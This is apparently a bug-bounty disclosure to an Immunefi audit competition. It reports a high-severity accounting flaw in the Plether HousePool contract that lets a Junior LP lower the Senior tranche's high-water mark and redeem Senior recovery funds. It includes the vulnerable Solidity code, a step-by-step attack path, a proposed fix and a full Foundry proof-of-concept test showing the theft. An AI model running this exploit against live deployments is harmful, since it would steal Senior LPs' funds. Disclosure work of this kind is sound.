# \#98274 [SC-High] Residual Recapitalization Enables Direct Theft of Senior LP Funds

**Submitted on Nov 6th 2026 at 15:58:32 UTC by @Petrus for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98274
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro
Junior LPs receive revenue that should have gone to Senior first.


## Vulnerability Details


A residual recapitalization is repeatedly treated as newly backed by the pool’s existing equity, causing Senior principal to be artificially wiped and recreated while replacing Senior’s original recovery target with a smaller value.


A later reconciliation incorrectly treats the entire distributable balance—including the equity already backing Senior principal—as available for settling the residual recapitalization.

## Take a Look at the protocol flow:

`HousePool` caps the pending recapitalization against the entire distributable balance without excluding value already backing existing principal:

```solidity
function _settleablePendingClaimantBuckets(
    HousePoolAccountingLib.ReconcileSnapshot memory reconcileSnapshot,
    HousePoolPendingPreviewLib.ClaimantPendingBuckets memory claimantBuckets
) internal pure returns (
    HousePoolPendingPreviewLib.ClaimantPendingBuckets memory settleableClaimantBuckets
) {
    return HousePoolPendingPreviewLib.capClaimantBuckets(
        claimantBuckets,
        reconcileSnapshot.distributable
    );
}
```

`HousePoolReconcilePlanLib` then removes that supposedly settleable recapitalization from distributable equity before reconciling the existing Senior and Junior principal:

```solidity
function planReconcile(
    HousePoolPendingPreviewLib.PendingAccountingState memory state,
    HousePoolAccountingLib.ReconcileSnapshot memory snapshot,
    uint256 pendingBucketAssets,
    uint256 seniorRateBps,
    uint256 couponElapsed,
    bool markFresh
) internal pure returns (ReconcilePlan memory plan) {
    plan.state = state;
    plan.markFresh = markFresh;

    if (couponElapsed > 0 && state.juniorSupply > 0) {
        (plan.state.waterfall,) =
            HousePoolWaterfallAccountingLib.paySeniorCoupon(
                plan.state.waterfall,
                seniorRateBps,
                couponElapsed
            );
    }

    plan.juniorSupplyZero = plan.state.juniorSupply == 0;
    plan.claimedEquityZero =
        plan.state.waterfall.seniorPrincipal
            + plan.state.waterfall.juniorPrincipal
            == 0;

    if (!markFresh) {
        return plan;
    }

    if (pendingBucketAssets > 0) {
        snapshot.distributable =
            snapshot.distributable > pendingBucketAssets
                ? snapshot.distributable - pendingBucketAssets
                : 0;
    }

    plan.state.unassignedAssets =
        state.unassignedAssets > snapshot.distributable
            ? snapshot.distributable
            : state.unassignedAssets;

    if (plan.claimedEquityZero) {
        uint256 seededDistributableToClaims =
            snapshot.distributable > plan.state.unassignedAssets
                ? snapshot.distributable
                    - plan.state.unassignedAssets
                : 0;

        HousePoolPendingPreviewLib.applyRevenueIntent(
            plan.state,
            seededDistributableToClaims
        );

        return plan;
    }

    uint256 distributableToClaims =
        snapshot.distributable > plan.state.unassignedAssets
            ? snapshot.distributable
                - plan.state.unassignedAssets
            : 0;

    HousePoolWaterfallAccountingLib.ReconcilePlan memory waterfallPlan =
        HousePoolWaterfallAccountingLib.planReconcile(
            plan.state.waterfall.seniorPrincipal,
            plan.state.waterfall.juniorPrincipal,
            distributableToClaims
        );

    plan.revenue = waterfallPlan.isRevenue;
    plan.deltaAssets = waterfallPlan.deltaAssets;

    if (plan.revenue) {
        plan.juniorPrincipalBeforeRevenue =
            plan.state.waterfall.juniorPrincipal;

        plan.state.waterfall =
            HousePoolWaterfallAccountingLib.distributeRevenue(
                plan.state.waterfall,
                plan.deltaAssets
            );

        return plan;
    }

    if (plan.deltaAssets > 0) {
        plan.state.waterfall =
            HousePoolWaterfallAccountingLib.absorbLoss(
                plan.state.waterfall,
                plan.deltaAssets
            );

        return plan;
    }
}
```

When that artificial loss wipes both principals, `applyClaimantRecapitalizationIntent` recreates Senior but overwrites its existing HWM with the smaller residual recapitalization target:

```solidity
function applyClaimantRecapitalizationIntent(
    PendingAccountingState memory state,
    uint256 amount,
    uint256 recapitalizationTargetAssets
) internal pure {
    uint256 remaining = amount;

    if (state.seniorSupply > 0) {
        if (
            state.waterfall.seniorPrincipal == 0
                && state.waterfall.juniorPrincipal == 0
        ) {
            state.waterfall.seniorPrincipal += remaining;
            state.waterfall.seniorHighWaterMark =
                recapitalizationTargetAssets > remaining
                    ? recapitalizationTargetAssets
                    : remaining;
            remaining = 0;
        } else {
            uint256 gap =
                state.waterfall.seniorHighWaterMark
                    > state.waterfall.seniorPrincipal
                    ? state.waterfall.seniorHighWaterMark
                        - state.waterfall.seniorPrincipal
                    : 0;

            if (gap > 0) {
                uint256 seniorAssignedAssets =
                    remaining > gap ? gap : remaining;

                state.waterfall.seniorPrincipal +=
                    seniorAssignedAssets;
                remaining -= seniorAssignedAssets;
            }
        }
    }

    if (remaining > 0) {
        state.unassignedAssets += remaining;
    }
}
```

## Explanation

The same physical pool equity is first counted as existing Senior principal and then reserved again as backing for the residual recapitalization, which creates a fake Senior loss and allows the smaller residual amount to replace Senior’s original recovery HWM.

Once the HWM is reduced, later recovery restores Senior only to that corrupted target and credits all remaining settlement tokens to Junior principal.

This is Production reachability because After an ordinary owner recapitalization and degraded-mode recovery, a Junior LP can submit matured redemption requests and repeatedly trigger permissionless `settleLpEpoch` calls while the residual recapitalization remains pending.


An external attacker holding Junior shares can corrupt the Senior HWM, wait for recovery assets to enter the pool, and redeem the settlement tokens incorrectly credited to Junior.


Therefore, Senior LPs receive fewer settlement tokens than their protected recovery entitlement, while Junior LPs receive and withdraw the exact value diverted from Senior.

This is direct theft because accounted settlement tokens already held at rest in `HousePool` for Senior recovery are reassigned to the attacker’s Junior shares and transferred to the attacker during redemption; the stolen value is LP principal backing, not unclaimed yield.


## Impact

Revenue meant to restore Senior LPs’ losses is instead credited to Junior LPs.

This issue directly steals accounted settlement tokens from Senior LPs by crediting their protected recovery to Junior LPs, who can withdraw the diverted funds.

The production-flow PoC makes approximately **63,290.21 settlement tokens unavailable to the Senior victim and transfers approximately 63,290.23 settlement tokens to the Junior attacker**, with the small difference caused by pro-rata rounding and coupon dust.




## Short attack path

1. Senior and Junior LPs deposit settlement tokens.
2. Trading losses impair the pool and create a Senior recovery deficit.
3. The owner performs a normal recapitalization and clears degraded mode.
4. The Junior attacker repeatedly requests redemption and triggers epoch settlement.
5. Reconciliation repeatedly consumes the residual recapitalization and lowers Senior’s HWM.
6. Recovery tokens enter the pool but are credited to Junior above the corrupted HWM.
7. The attacker redeems Junior shares and receives the diverted settlement tokens.

## Best solution

Keep `seniorHighWaterMark` monotonic during empty-principal recapitalization by taking the maximum of the existing HWM, the full recapitalization target, and the currently applied amount.

```solidity
function applyClaimantRecapitalizationIntent(
    PendingAccountingState memory state,
    uint256 amount,
    uint256 recapitalizationTargetAssets
) internal pure {
    uint256 remaining = amount;

    if (state.seniorSupply > 0) {
        if (
            state.waterfall.seniorPrincipal == 0
                && state.waterfall.juniorPrincipal == 0
        ) {
            state.waterfall.seniorPrincipal += remaining;

            uint256 bootstrapHighWaterMark =
                recapitalizationTargetAssets > remaining
                    ? recapitalizationTargetAssets
                    : remaining;

            if (
                bootstrapHighWaterMark
                    > state.waterfall.seniorHighWaterMark
            ) {
                state.waterfall.seniorHighWaterMark =
                    bootstrapHighWaterMark;
            }

            remaining = 0;
        } else {
            uint256 gap =
                state.waterfall.seniorHighWaterMark
                    > state.waterfall.seniorPrincipal
                    ? state.waterfall.seniorHighWaterMark
                        - state.waterfall.seniorPrincipal
                    : 0;

            if (gap > 0) {
                uint256 seniorAssignedAssets =
                    remaining > gap ? gap : remaining;

                state.waterfall.seniorPrincipal +=
                    seniorAssignedAssets;
                remaining -= seniorAssignedAssets;
            }
        }
    }

    if (remaining > 0) {
        state.unassignedAssets += remaining;
    }
}
```



## Proof of Concept

## Proof of Concept

Put the test in this path; packages/perps/test/PendingRecapRepeatedReconcilePoC.t.sol   Command to run:

forge test --match-test test_PoC_RepeatedResidualRecapMovesSeniorRecoveryToJunior -vvvv


```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {HousePoolTestBase} from "./perps/shared/HousePoolTestBase.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {HousePoolRedemptionMathLib} from "@plether/perps/libraries/HousePoolRedemptionMathLib.sol";
import {HousePoolSeniorCapacityLib} from "@plether/perps/libraries/HousePoolSeniorCapacityLib.sol";

contract PendingRecapRepeatedReconcilePoC is HousePoolTestBase {

    function test_PoC_RepeatedResidualRecapMovesSeniorRecoveryToJunior() public {
        address seniorLp = address(0xA11CE);
        address juniorAttacker = address(0xB0B);
        address longTrader = address(0x1001);
        address shortTrader = address(0x1002);

        _fundJunior(juniorAttacker, 99_000e6);
        _fundSenior(seniorLp, 99_000e6);
        assertEq(pool.seniorPrincipal() + pool.juniorPrincipal(), 200_000e6, "LP principal is funded normally");
        assertGt(juniorVault.balanceOf(juniorAttacker), 0, "attacker owns real Junior shares");

        _fundTrader(longTrader, 20_000e6);
        _fundTrader(shortTrader, 20_000e6);
        vm.prank(longTrader);
        uint64 orderId = router.commitOrder(CfdTypes.Side.LONG, 190_000e18, 10_000e6, 0, false);
        router.executeOrder(orderId, _mockPythUpdateData(1e8));
        vm.prank(shortTrader);
        orderId = router.commitOrder(CfdTypes.Side.SHORT, 80_000e18, 5000e6, 0, false);
        router.executeOrder(orderId, _mockPythUpdateData(1e8));
        vm.prank(longTrader);
        orderId = router.commitOrder(CfdTypes.Side.LONG, 190_000e18, 0, 0, true);
        router.executeOrder(orderId, _mockPythUpdateData(1e6));
        vm.prank(shortTrader);
        orderId = router.commitOrder(CfdTypes.Side.SHORT, 80_000e18, 0, 0, true);
        router.executeOrder(orderId, _mockPythUpdateData(2e8));

        uint256 traderClaims = engine.totalTraderClaimBalanceAssets();
        assertGt(traderClaims, 50_000e6, "real losing-LP trades create a large deferred trader claim");
        assertTrue(engine.degradedMode(), "the real settlement flow enters degraded mode");

        uint256 recapitalization = 100_000e6;
        settlementToken.mint(address(this), recapitalization);
        settlementToken.approve(address(engine), recapitalization);
        engine.recapitalizePool(recapitalization);
        assertEq(
            pool.pendingRecapitalizationAssets(),
            recapitalization,
            "owner recap is queued through production entrypoint"
        );
        engine.clearDegradedMode();
        assertFalse(engine.degradedMode(), "normal owner recovery reopens LP epoch settlement");

        vm.warp(juniorVault.lastDepositTime(juniorAttacker) + juniorVault.DEPOSIT_COOLDOWN());
        uint256 attackerShares = juniorVault.balanceOf(juniorAttacker);
        vm.prank(juniorAttacker);
        uint256 requestId = juniorVault.requestRedeem(attackerShares, juniorAttacker, juniorAttacker);
        vm.warp(pool.lpEpochStart(requestId));
        IHousePool.LpEpochSettlementResult memory result = pool.settleLpEpoch(0, 0);
        assertEq(result.juniorProcessedEpochs, 1, "first real epoch settlement commits the partial recap");
        assertEq(pool.juniorPrincipal(), 0, "Junior is wiped");
        assertGt(pool.seniorPrincipal(), 0, "only the backed recap portion becomes Senior principal");
        assertGt(pool.pendingRecapitalizationAssets(), 0, "the unbacked recap remains pending");
        uint256 protectedSeniorBeforeAttack = pool.seniorHighWaterMark();
        uint256 backedSenior = pool.seniorPrincipal();
        assertEq(
            protectedSeniorBeforeAttack, recapitalization, "the first pass records the full Senior recovery target"
        );
        vm.prank(juniorAttacker);
        juniorVault.claimRedeemRefund(requestId, juniorAttacker, juniorAttacker);

        vm.warp(juniorVault.lastDepositTime(juniorAttacker) + juniorVault.DEPOSIT_COOLDOWN());
        attackerShares = juniorVault.balanceOf(juniorAttacker);
        vm.prank(juniorAttacker);
        requestId = juniorVault.requestRedeem(attackerShares, juniorAttacker, juniorAttacker);
        vm.warp(pool.lpEpochStart(requestId));
        result = pool.settleLpEpoch(0, 0);
        assertEq(result.juniorProcessedEpochs, 1, "attacker refund supplies production settlement progress");
        assertEq(pool.seniorPrincipal(), backedSenior, "the same terminal equity is re-applied as Senior principal");
        assertLt(
            pool.seniorHighWaterMark(), protectedSeniorBeforeAttack, "BUG: repeated reconcile destroys Senior priority"
        );
        vm.prank(juniorAttacker);
        juniorVault.claimRedeemRefund(requestId, juniorAttacker, juniorAttacker);

        while (pool.pendingRecapitalizationAssets() != 0) {
            uint256 pendingBefore = pool.pendingRecapitalizationAssets();
            vm.warp(juniorVault.lastDepositTime(juniorAttacker) + juniorVault.DEPOSIT_COOLDOWN());
            attackerShares = juniorVault.balanceOf(juniorAttacker);
            vm.prank(juniorAttacker);
            requestId = juniorVault.requestRedeem(attackerShares, juniorAttacker, juniorAttacker);
            vm.warp(pool.lpEpochStart(requestId));
            pool.settleLpEpoch(0, 0);
            assertLt(
                pool.pendingRecapitalizationAssets(),
                pendingBefore,
                "each attack pass consumes the residual without new backing"
            );
            vm.prank(juniorAttacker);
            juniorVault.claimRedeemRefund(requestId, juniorAttacker, juniorAttacker);
        }

        uint256 loweredSeniorTarget = pool.seniorHighWaterMark();
        assertLt(loweredSeniorTarget, protectedSeniorBeforeAttack, "Senior protection remains permanently reduced");
        assertEq(pool.seniorPrincipal(), backedSenior, "no new backing entered during repeated reconciles");

        uint256 recovery = protectedSeniorBeforeAttack - pool.seniorPrincipal();
        settlementToken.mint(address(this), recovery);
        settlementToken.transfer(address(pool), recovery);
        pool.accountExcess();
        assertEq(pool.excessAssets(), 0, "owner admits the recovery through the production excess-accounting path");

        {
            (uint256 projectedSenior, uint256 projectedJunior,, uint256 actualJuniorWithdrawalCapacity) =
                pool.getPendingTrancheState();
            uint256 stolenSeniorPriority = protectedSeniorBeforeAttack - projectedSenior;
            assertEq(projectedSenior, loweredSeniorTarget, "recovery restores Senior only to the corrupted lower HWM");
            assertEq(
                projectedJunior, stolenSeniorPriority, "every unit removed from Senior priority is credited to Junior"
            );

            uint256 actualSeniorDepositCapacity = pool.getSeniorDepositCapacity();
            uint256 capacityUsingCorruptedHwm = HousePoolSeniorCapacityLib.depositCapacity(
                projectedSenior,
                loweredSeniorTarget,
                projectedJunior,
                pool.reservedSeniorDepositAssets(),
                pool.maxSeniorExposureAssets(),
                pool.maxSeniorShareBps()
            );
            uint256 capacityUsingCorrectHwm = HousePoolSeniorCapacityLib.depositCapacity(
                projectedSenior,
                protectedSeniorBeforeAttack,
                projectedJunior,
                pool.reservedSeniorDepositAssets(),
                pool.maxSeniorExposureAssets(),
                pool.maxSeniorShareBps()
            );
            assertEq(actualSeniorDepositCapacity, capacityUsingCorruptedHwm, "pool admission uses the corrupted HWM");
            assertGt(
                actualSeniorDepositCapacity,
                capacityUsingCorrectHwm,
                "lower HWM improperly relaxes Senior admission capacity"
            );

            uint256 withdrawalCapacityUsingCorruptedHwm = HousePoolSeniorCapacityLib.juniorWithdrawalRatioCap(
                projectedSenior,
                loweredSeniorTarget,
                projectedJunior,
                pool.reservedSeniorDepositAssets(),
                pool.maxSeniorShareBps()
            );
            uint256 withdrawalCapacityUsingCorrectHwm = HousePoolSeniorCapacityLib.juniorWithdrawalRatioCap(
                projectedSenior,
                protectedSeniorBeforeAttack,
                projectedJunior,
                pool.reservedSeniorDepositAssets(),
                pool.maxSeniorShareBps()
            );
            assertEq(
                actualJuniorWithdrawalCapacity,
                withdrawalCapacityUsingCorruptedHwm,
                "Junior withdrawal protection uses the corrupted HWM"
            );
            assertGt(
                actualJuniorWithdrawalCapacity,
                withdrawalCapacityUsingCorrectHwm,
                "lower HWM improperly relaxes Junior withdrawal protection"
            );
        }

        // The recovery is now real, accounted settlement-token cash sitting at rest in HousePool. Under the intact
        // waterfall every unit belongs to Senior until the original HWM is restored, leaving Junior with zero.
        uint256 atRestRecoveryAssets = pool.rawAssets();
        assertEq(pool.accountedAssets(), atRestRecoveryAssets, "recovery is accounted user-backing cash at rest");
        (uint256 recoveredSenior, uint256 recoveredJunior,,) = pool.getPendingTrancheState();
        assertEq(
            recoveredSenior + recoveredJunior,
            protectedSeniorBeforeAttack,
            "the recovered pool has enough cash to restore Senior completely"
        );

        uint256 victimShares = seniorVault.balanceOf(seniorLp);
        uint256 victimAssetsWithoutBug = HousePoolRedemptionMathLib.netAssetsForShares(
            victimShares, protectedSeniorBeforeAttack, seniorVault.accruedTotalSupply(), 1, 1000, 0
        );
        assertGt(victimAssetsWithoutBug, 0, "Senior victim has a concrete cash entitlement");

        // Queue victim and attacker in the same epoch. Settlement prices both against the same physical pool cash,
        // making the victim's loss and the attacker's gain directly observable as token transfers.
        uint256 victimUnlockTime = seniorVault.lastDepositTime(seniorLp) + seniorVault.DEPOSIT_COOLDOWN();
        uint256 attackerUnlockTime = juniorVault.lastDepositTime(juniorAttacker) + juniorVault.DEPOSIT_COOLDOWN();
        uint256 redemptionUnlockTime = victimUnlockTime > attackerUnlockTime ? victimUnlockTime : attackerUnlockTime;
        if (block.timestamp < redemptionUnlockTime) {
            vm.warp(redemptionUnlockTime);
        }
        vm.prank(seniorLp);
        uint256 victimRequestId = seniorVault.requestRedeem(victimShares, seniorLp, seniorLp);

        attackerShares = juniorVault.balanceOf(juniorAttacker);
        vm.prank(juniorAttacker);
        requestId = juniorVault.requestRedeem(attackerShares, juniorAttacker, juniorAttacker);
        assertEq(requestId, victimRequestId, "victim and attacker redeem in the same settlement epoch");
        vm.warp(pool.lpEpochStart(requestId));
        uint256 victimAssetsBefore = settlementToken.balanceOf(seniorLp);
        uint256 attackerAssetsBefore = settlementToken.balanceOf(juniorAttacker);
        result = pool.settleLpEpoch(0, 0);

        assertLt(
            pool.seniorPrincipal(),
            loweredSeniorTarget,
            "only the seed holder's fraction remains after the Senior victim is underpaid"
        );
        assertLt(
            result.seniorFundedAssets,
            protectedSeniorBeforeAttack,
            "Senior redemption is priced below its original recovery entitlement"
        );
        assertGt(result.seniorFundedAssets, 0, "Senior victim receives only the corrupted residual entitlement");
        assertEq(result.seniorFundedShares, victimShares, "Senior victim's entire redemption is priced under the bug");
        assertLt(
            result.seniorFundedAssets, victimAssetsWithoutBug, "Senior victim suffers an immediately realizable loss"
        );
        assertGt(result.juniorFundedAssets, 0, "misdirected Senior recovery is immediately funded to Junior");
        assertEq(
            result.juniorFundedShares,
            attackerShares,
            "Junior attacker's entire redemption is funded from the diverted recovery"
        );
        assertGt(
            seniorVault.claimableRedeemAssets(victimRequestId, seniorLp), 0, "victim receives a reduced cash claim"
        );
        assertGt(
            juniorVault.claimableRedeemAssets(requestId, juniorAttacker),
            0,
            "attacker receives a real withdrawable claim"
        );

        vm.prank(seniorLp);
        uint256 victimReceived = seniorVault.claimRedeem(victimRequestId, result.seniorFundedShares, seniorLp, seniorLp);
        vm.prank(juniorAttacker);
        uint256 attackerReceived =
            juniorVault.claimRedeem(requestId, result.juniorFundedShares, juniorAttacker, juniorAttacker);

        uint256 victimDirectLoss = victimAssetsWithoutBug - victimReceived;
        assertGt(victimDirectLoss, 60_000e6, "Senior victim directly loses more than 60,000 settlement tokens");
        assertGt(attackerReceived, 60_000e6, "Junior attacker directly receives more than 60,000 settlement tokens");
        assertEq(
            settlementToken.balanceOf(seniorLp) - victimAssetsBefore,
            victimReceived,
            "victim receives fewer real tokens than the intact waterfall promises"
        );
        assertEq(
            settlementToken.balanceOf(juniorAttacker) - attackerAssetsBefore,
            attackerReceived,
            "attacker receives real settlement tokens"
        );
        assertApproxEqAbs(
            attackerReceived,
            victimDirectLoss,
            20_000,
            "CRITICAL: attacker's token gain matches Senior victim's direct loss within two cents of pro-rata dust"
        );
    }

}
```
